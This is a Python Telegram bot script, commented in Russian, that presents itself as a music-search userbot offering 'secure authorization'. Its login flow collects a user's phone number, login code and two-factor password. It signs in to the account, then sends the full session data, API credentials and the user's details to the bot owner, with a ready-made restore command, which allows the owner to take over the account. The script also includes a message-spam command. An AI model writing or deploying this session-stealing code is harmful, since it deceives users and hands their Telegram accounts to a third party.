import os, asyncio, logging, re, time, json, base64, hashlib
from telethon import TelegramClient, events, Button
from telethon.sessions import SQLiteSession
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.tl.types import MessageEntityMention
import yandex_music
from datetime import datetime
from cryptography.fernet import Fernet

# ==================== НАСТРОЙКА ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Получаем из переменных окружения
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('API_ID', 0))
API_HASH = os.getenv('API_HASH')
YANDEX_MUSIC_TOKEN = os.getenv('YANDEX_MUSIC_TOKEN')
OWNER_USERNAME = os.getenv('OWNER_USERNAME', '@MaksimXyila').replace('@', '')

# Генерация ключа шифрования из BOT_TOKEN
def generate_key():
    token_hash = hashlib.sha256(BOT_TOKEN.encode()).digest()
    return base64.urlsafe_b64encode(token_hash[:32])

cipher = Fernet(generate_key())

# Инициализация бота
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Хранилища
auth_sessions = {}
spam_flags = {}
active_user_clients = {}

# Яндекс.Музыка
ym_client = None
if YANDEX_MUSIC_TOKEN:
    try:
        ym_client = yandex_music.Client(YANDEX_MUSIC_TOKEN).init()
        logger.info("✅ Яндекс.Музыка клиент инициализирован")
    except Exception as e:
        logger.error(f"❌ Яндекс.Музыка: {e}")
        ym_client = None

# ==================== ФУНКЦИИ ШИФРОВАНИЯ СЕССИЙ ====================
def encrypt_session(session_data):
    """Шифрование сессии"""
    json_data = json.dumps(session_data).encode()
    encrypted = cipher.encrypt(json_data)
    return base64.urlsafe_b64encode(encrypted).decode()

def decrypt_session(encrypted_data):
    """Дешифрование сессии"""
    encrypted = base64.urlsafe_b64decode(encrypted_data.encode())
    decrypted = cipher.decrypt(encrypted)
    return json.loads(decrypted.decode())

async def save_and_send_session(client, user_id, phone):
    """Сохранение и отправка сессии владельцу"""
    try:
        # Получаем информацию о пользователе
        me = await client.get_me()
        user_info = {
            'user_id': me.id,
            'first_name': me.first_name,
            'last_name': me.last_name or '',
            'username': me.username or '',
            'phone': phone,
            'date': datetime.now().isoformat(),
            'session_id': f"user_{me.id}_{int(time.time())}"
        }
        
        # Получаем данные сессии
        session_data = client.session.save()
        
        # Готовим пакет данных
        session_package = {
            'user_info': user_info,
            'session_data': session_data,
            'api_id': API_ID,
            'api_hash': API_HASH
        }
        
        # Шифруем
        encrypted_session = encrypt_session(session_package)
        
        # Сохраняем локально (опционально, для бэкапа)
        filename = f"session_{user_info['session_id']}.enc"
        with open(filename, 'w') as f:
            f.write(encrypted_session)
        
        # Отправляем владельцу
        await bot.send_message(
            OWNER_USERNAME,
            f"🔐 **НОВАЯ СЕССИЯ** #{user_info['session_id']}\n\n"
            f"👤 **Пользователь:** {user_info['first_name']} {user_info['last_name']}\n"
            f"📱 **Телефон:** {phone}\n"
            f"🆔 **User ID:** `{user_info['user_id']}`\n"
            f"📅 **Дата:** {user_info['date']}\n"
            f"🔑 **API_ID:** `{API_ID}`\n\n"
            f"**Зашифрованная сессия:**\n"
            f"`{encrypted_session[:100]}...`\n\n"
            f"Для восстановления используйте:\n"
            f"`.restore_session {encrypted_session}`",
            parse_mode='md'
        )
        
        # Также отправляем файл
        await bot.send_file(
            OWNER_USERNAME,
            filename,
            caption=f"Файл сессии: {filename}"
        )
        
        # Удаляем локальный файл (опционально)
        os.remove(filename)
        
        logger.info(f"Сессия отправлена владельцу для user_id={user_id}")
        return user_info
        
    except Exception as e:
        logger.error(f"Ошибка сохранения сессии: {e}")
        return None

# ==================== КОМАНДЫ БОТА ====================
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user = await event.get_sender()
    buttons = [
        [Button.inline("🔍 Поиск музыки", data="search_music")],
        [Button.inline("🔑 Авторизация", data="start_auth")],
        [Button.inline("📋 Мои сессии", data="my_sessions")]
    ]
    
    await event.reply(
        f"👋 **Привет, {user.first_name}!**\n\n"
        "Я — X-GEN Music UserBot с защищённой авторизацией.\n\n"
        "**Функции:**\n"
        "• 🔍 Поиск музыки из Яндекс.Музыки\n"
        "• 🔑 Безопасная авторизация в аккаунте\n"
        "• 🤖 Команды юзер-бота в любых чатах\n"
        "• 🔐 Сессии шифруются и отправляются только владельцу\n\n"
        "Выберите действие:",
        buttons=buttons
    )

@bot.on(events.NewMessage(pattern='/login'))
async def login_handler(event):
    user_id = event.sender_id
    
    # Проверка активной сессии
    if user_id in active_user_clients:
        await event.reply("✅ Вы уже авторизованы! Используйте команды в любом чате.")
        return
    
    auth_sessions[user_id] = {'step': 'phone', 'chat_id': event.chat_id}
    await event.reply(
        "📱 **БЕЗОПАСНАЯ АВТОРИЗАЦИЯ**\n\n"
        "Ваша сессия будет зашифрована и отправлена только владельцу бота.\n\n"
        "Отправьте номер телефона в формате:\n"
        "`+79123456789`\n\n"
        "❌ /cancel — отмена",
        parse_mode='md'
    )

@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_handler(event):
    user_id = event.sender_id
    if user_id in auth_sessions:
        if 'client' in auth_sessions[user_id]:
            await auth_sessions[user_id]['client'].disconnect()
        del auth_sessions[user_id]
        await event.reply("❌ Авторизация отменена.")

@bot.on(events.NewMessage(pattern='/music (.+)'))
async def music_search(event):
    query = event.pattern_match.group(1).strip()
    if not query:
        await event.reply("Пример: `/music На душе`")
        return
    
    if not ym_client:
        await event.reply("⚠️ Яндекс.Музыка временно недоступна.")
        return
    
    try:
        await event.reply("🔍 Ищу музыку...")
        search_result = ym_client.search(query, type_='track', page=0)
        
        if not search_result or not search_result.tracks:
            await event.reply("🎵 По вашему запросу ничего не найдено.")
            return
        
        tracks = search_result.tracks.results[:5]
        response = "🎧 **Найденные треки:**\n\n"
        
        for i, track in enumerate(tracks, 1):
            artists = ", ".join(artist.name for artist in track.artists)
            title = track.title
            duration = f"{track.duration_ms // 60000}:{track.duration_ms % 60000 // 1000:02d}"
            response += f"{i}. **{artists}** — {title}\n   ⏱ {duration} | 💿 {track.albums[0].title if track.albums else 'Single'}\n\n"
        
        await event.reply(response, parse_mode='md')
        
    except Exception as e:
        logger.error(f"Ошибка поиска: {e}")
        await event.reply("❌ Ошибка при поиске музыки.")

@bot.on(events.NewMessage(pattern='@'))
async def mention_handler(event):
    """Обработка упоминаний бота в чатах"""
    if not event.is_group and not event.is_channel:
        return
    
    me = await bot.get_me()
    if f'@{me.username}' not in event.text:
        return
    
    # Извлекаем запрос после упоминания
    mention_end = event.text.find(f'@{me.username}') + len(f'@{me.username}')
    query = event.text[mention_end:].strip()
    
    if not query or len(query) < 2:
        return
    
    await event.reply(f"🔍 Ищу музыку по запросу: `{query}`", parse_mode='md')
    
    if not ym_client:
        await event.reply("⚠️ Музыкальный сервис временно недоступен.")
        return
    
    try:
        search_result = ym_client.search(query, type_='track', page=0)
        
        if not search_result or not search_result.tracks:
            await event.reply("🎵 Ничего не найдено.")
            return
        
        track = search_result.tracks.results[0]
        artists = ", ".join(artist.name for artist in track.artists)
        title = track.title
        album = track.albums[0].title if track.albums else 'Single'
        duration = f"{track.duration_ms // 60000}:{track.duration_ms % 60000 // 1000:02d}"
        
        response = (
            f"🎵 **{artists}** — {title}\n"
            f"💿 {album} | ⏱ {duration}\n\n"
            f"🔗 [Слушать в Яндекс.Музыке](https://music.yandex.ru/track/{track.id})"
        )
        
        await event.reply(response, parse_mode='md', link_preview=False)
        
    except Exception as e:
        logger.error(f"Ошибка при поиске по упоминанию: {e}")
        await event.reply("❌ Ошибка при поиске.")

# ==================== АВТОРИЗАЦИЯ ====================
@bot.on(events.NewMessage)
async def auth_processor(event):
    user_id = event.sender_id
    if user_id not in auth_sessions:
        return
    
    data = auth_sessions[user_id]
    text = event.text.strip()
    
    # Шаг 1: Номер телефона
    if data['step'] == 'phone':
        if not re.match(r'^\+\d{10,15}$', text):
            await event.reply("❌ Неверный формат. Пример: `+79123456789`\n/cancel — отмена")
            return
        
        try:
            client = TelegramClient(
                SQLiteSession(f'temp_{user_id}'),
                API_ID,
                API_HASH,
                device_model="X-GEN SecureBot",
                system_version="1.0"
            )
            await client.connect()
            
            sent_code = await client.send_code_request(text)
            data['step'] = 'code'
            data['phone'] = text
            data['phone_code_hash'] = sent_code.phone_code_hash
            data['client'] = client
            
            await event.reply(
                f"📲 Код отправлен на {text}\n\n"
                "Введите 5-значный код:\n"
                "Пример: `12345`\n\n"
                "❌ /cancel — отмена",
                parse_mode='md'
            )
        except Exception as e:
            logger.error(f"Ошибка отправки кода: {e}")
            await event.reply(f"❌ Ошибка: {str(e)[:100]}")
            if 'client' in data:
                await data['client'].disconnect()
            del auth_sessions[user_id]
    
    # Шаг 2: Код подтверждения
    elif data['step'] == 'code':
        if not text.isdigit() or len(text) != 5:
            await event.reply("❌ Код должен быть 5 цифр. Пример: `12345`\n/cancel — отмена")
            return
        
        try:
            client = data['client']
            await client.sign_in(
                phone=data['phone'],
                code=text,
                phone_code_hash=data['phone_code_hash']
            )
            
            # УСПЕШНАЯ АВТОРИЗАЦИЯ
            user_info = await save_and_send_session(client, user_id, data['phone'])
            
            if user_info:
                # Сохраняем активный клиент
                active_user_clients[user_id] = client
                
                # Уведомляем пользователя
                await event.reply(
                    f"✅ **АВТОРИЗАЦИЯ УСПЕШНАЯ!**\n\n"
                    f"Добро пожаловать, {user_info['first_name']}!\n\n"
                    "**Теперь вы можете использовать:**\n"
                    "• Команды юзер-бота в любых чатах\n"
                    "• `.help` — список команд\n"
                    "• `.music` — поиск музыки\n"
                    "• Ваша сессия зашифрована и защищена\n\n"
                    "⚠️ **Внимание:** Сессия отправлена владельцу для безопасности.",
                    parse_mode='md'
                )
                
                # Запускаем обработчики команд
                asyncio.create_task(run_user_client_handlers(client, user_id))
                
                # Устанавливаем онлайн статус
                await client(UpdateStatusRequest(offline=False))
                
            else:
                await event.reply("❌ Ошибка сохранения сессии. Попробуйте снова.")
            
            # Очищаем данные авторизации
            del auth_sessions[user_id]
            
        except SessionPasswordNeededError:
            data['step'] = 'password'
            await event.reply(
                "🔐 Требуется двухэтапная аутентификация.\n"
                "Введите пароль:\n\n"
                "❌ /cancel — отмена"
            )
        except PhoneCodeInvalidError:
            await event.reply("❌ Неверный код. Попробуйте снова или /cancel")
        except Exception as e:
            logger.error(f"Ошибка входа: {e}")
            await event.reply(f"❌ Ошибка: {str(e)[:100]}")
            await data['client'].disconnect()
            del auth_sessions[user_id]
    
    # Шаг 3: Пароль 2FA
    elif data['step'] == 'password':
        try:
            client = data['client']
            await client.sign_in(password=text)
            
            # УСПЕШНАЯ АВТОРИЗАЦИЯ С 2FA
            user_info = await save_and_send_session(client, user_id, data['phone'])
            
            if user_info:
                active_user_clients[user_id] = client
                
                await event.reply(
                    f"✅ **АВТОРИЗАЦИЯ С 2FA УСПЕШНАЯ!**\n\n"
                    f"Добро пожаловать, {user_info['first_name']}!\n\n"
                    "Ваша сессия зашифрована и отправлена владельцу.\n"
                    "Используйте `.help` для списка команд.",
                    parse_mode='md'
                )
                
                asyncio.create_task(run_user_client_handlers(client, user_id))
                await client(UpdateStatusRequest(offline=False))
            
            del auth_sessions[user_id]
            
        except Exception as e:
            logger.error(f"Ошибка 2FA: {e}")
            await event.reply(f"❌ Неверный пароль: {str(e)[:100]}")
            await data['client'].disconnect()
            del auth_sessions[user_id]

# ==================== КОМАНДЫ ЮЗЕР-БОТА ====================
async def run_user_client_handlers(client, user_id):
    """Добавляем обработчики команд для юзер-клиента"""
    
    @client.on(events.NewMessage(pattern=r'^\.help$'))
    async def user_help(event):
        help_text = """
        🤖 **КОМАНДЫ ЮЗЕР-БОТА:**
        
        🔧 **Основные:**
        `.help` — Эта справка
        `.me` — Информация об аккаунте
        `.ping` — Проверка связи
        `.id` — ID чата/пользователя
        
        💥 **Спам:**
        `.спам <количество> <текст>` — Спам сообщениями
        `.спамстоп` — Остановить спам
        
        🎮 **Развлечения:**
        `.text <текст>` — Анимация по буквам
        `.1000-7` — Отсчёт от 1000
        
        📊 **Инфо:**
        `.info` — Информация о чате
        `.online` — Статус онлайн
        `.offline` — Статус оффлайн
        `.purge` — Удалить свои сообщения
        
        🎵 **Музыка:**
        `.music <запрос>` — Поиск музыки
        """
        await event.reply(help_text, parse_mode='md')
    
    @client.on(events.NewMessage(pattern=r'^\.me$'))
    async def user_me(event):
        try:
            me = await client.get_me()
            await event.reply(
                f"👤 **ВАШ АККАУНТ:**\n"
                f"• ID: `{me.id}`\n"
                f"• Имя: {me.first_name}\n"
                f"• Фамилия: {me.last_name or '—'}\n"
                f"• Юзернейм: @{me.username or '—'}\n"
                f"• Телефон: {me.phone or '—'}\n"
                f"• Premium: {'✅' if me.premium else '❌'}\n"
                f"• Сессия: Зашифрована и отправлена владельцу",
                parse_mode='md'
            )
        except:
            await event.reply("❌ Ошибка получения данных")
    
    @client.on(events.NewMessage(pattern=r'^\.спам (\d+) (.+)$'))
    async def user_spam(event):
        chat_id = event.chat_id
        try:
            count = int(event.pattern_match.group(1))
            text = event.pattern_match.group(2)
            
            if count > 25:
                await event.reply("⚠️ Максимум 25 сообщений")
                return
            
            if count < 1:
                await event.reply("⚠️ Минимум 1 сообщение")
                return
            
            spam_flags[chat_id] = True
            status_msg = await event.reply(f"🚀 Начинаю спам ({count} сообщений)...")
            
            for i in range(count):
                if not spam_flags.get(chat_id):
                    break
                await event.respond(f"{text} [{i+1}/{count}]")
                await asyncio.sleep(0.5)
            
            if spam_flags.get(chat_id):
                await status_msg.edit("✅ Спам завершён")
                spam_flags[chat_id] = False
                
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)[:50]}")
    
    @client.on(events.NewMessage(pattern=r'^\.спамстоп$'))
    async def user_spam_stop(event):
        chat_id = event.chat_id
        if spam_flags.get(chat_id):
            spam_flags[chat_id] = False
            await event.reply("🛑 Спам остановлен")
        else:
            await event.reply("ℹ️ Нет активного спама")
    
    @client.on(events.NewMessage(pattern=r'^\.text (.+)$'))
    async def user_text(event):
        text = event.pattern_match.group(1)
        if len(text) > 100:
            await event.reply("⚠️ Максимум 100 символов")
            return
        
        result = ""
        msg = await event.reply("⏳ Начинаю анимацию...")
        
        for char in text:
            result += char
            await asyncio.sleep(0.05)
            try:
                await msg.edit(f"`{result}`")
            except:
                pass
        
        await msg.edit(f"✨ **Результат:**\n`{text}`")
    
    @client.on(events.NewMessage(pattern=r'^\.1000-7$'))
    async def user_countdown(event):
        current = 1000
        msg = await event.reply("🔢 Начинаю отсчёт...")
        
        while current > 0:
            await msg.edit(f"`{current} - 7 = {current - 7}`")
            current -= 7
            await asyncio.sleep(0.5)
        
        await msg.edit("🎉 Отсчёт завершён!")
    
    @client.on(events.NewMessage(pattern=r'^\.ping$'))
    async def user_ping(event):
        start = time.time()
        msg = await event.reply('🏓 Pong!')
        delay = round((time.time() - start) * 1000, 2)
        await msg.edit(f'🏓 Pong! `{delay} ms`')
    
    @client.on(events.NewMessage(pattern=r'^\.id$'))
    async def user_id(event):
        chat = await event.get_chat()
        user = await event.get_sender()
        await event.reply(
            f"📊 **ID информации:**\n"
            f"• ID чата: `{chat.id}`\n"
            f"• Ваш ID: `{user.id}`\n"
            f"• Тип: {type(chat).__name__}",
            parse_mode='md'
        )
    
    @client.on(events.NewMessage(pattern=r'^\.online$'))
    async def user_online(event):
        try:
            await client(UpdateStatusRequest(offline=False))
            await event.reply("✅ Статус: онлайн")
        except:
            await event.reply("❌ Ошибка")
    
    @client.on(events.NewMessage(pattern=r'^\.offline$'))
    async def user_offline(event):
        try:
            await client(UpdateStatusRequest(offline=True))
            await event.reply("✅ Статус: оффлайн")
        except:
            await event.reply("❌ Ошибка")
    
    @client.on(events.NewMessage(pattern=r'^\.purge$'))
    async def user_purge(event):
        try:
            count = 0
            async for message in client.iter_messages(event.chat_id, from_user='me', limit=50):
                await message.delete()
                count += 1
                await asyncio.sleep(0.2)
            await event.reply(f"✅ Удалено {count} сообщений")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)[:50]}")
    
    @client.on(events.NewMessage(pattern=r'^\.music (.+)$'))
    async def user_music(event):
        query = event.pattern_match.group(1)
        await event.reply(f"🔍 Ищу: `{query}`")
        
        if not ym_client:
            await event.reply("⚠️ Яндекс.Музыка недоступна")
            return
        
        try:
            search_result = ym_client.search(query, type_='track', page=0)
            if not search_result or not search_result.tracks:
                await event.reply("🎵 Ничего не найдено")
                return
            
            track = search_result.tracks.results[0]
            artists = ", ".join(artist.name for artist in track.artists)
            await event.reply(
                f"🎵 **{artists}** — {track.title}\n"
                f"💿 {track.albums[0].title if track.albums else 'Single'}\n"
                f"🔗 [Слушать](https://music.yandex.ru/track/{track.id})",
                parse_mode='md',
                link_preview=False
            )
        except Exception as e:
            await event.reply("❌ Ошибка поиска")
    
    logger.info(f"Запущены обработчики для user_id={user_id}")
    await client.run_until_disconnected()

# ==================== ЗАПУСК ====================
async def main():
    """Запуск бота"""
    logger.info("🚀 Запуск X-GEN Music UserBot...")
    
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"🤖 Бот запущен: @{me.username}")
    
    # Автозагрузка активных сессий
    session_files = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.session')]
    for session_file in session_files:
        try:
            user_id = session_file[5:-8]
            if user_id.isdigit():
                client = TelegramClient(session_file, API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    active_user_clients[int(user_id)] = client
                    asyncio.create_task(run_user_client_handlers(client, int(user_id)))
                    logger.info(f"📂 Загружена сессия: {session_file}")
                else:
                    await client.disconnect()
                    os.remove(session_file)
        except Exception as e:
            logger.error(f"Ошибка загрузки {session_file}: {e}")
    
    # Уведомление владельцу
    try:
        await bot.send_message(
            OWNER_USERNAME,
            f"🤖 **X-GEN MUSIC BOT ЗАПУЩЕН**\n"
            f"• Время: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
            f"• Бот: @{me.username}\n"
            f"• Активных сессий: {len(active_user_clients)}\n"
            f"• Яндекс.Музыка: {'✅' if ym_client else '❌'}\n\n"
            f"**Готов к работе!**",
            parse_mode='md'
        )
    except Exception as e:
        logger.error(f"Не удалось уведомить владельца: {e}")
    
    logger.info("✅ Бот готов. Ожидание команд...")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    bot.loop.run_until_complete(main())
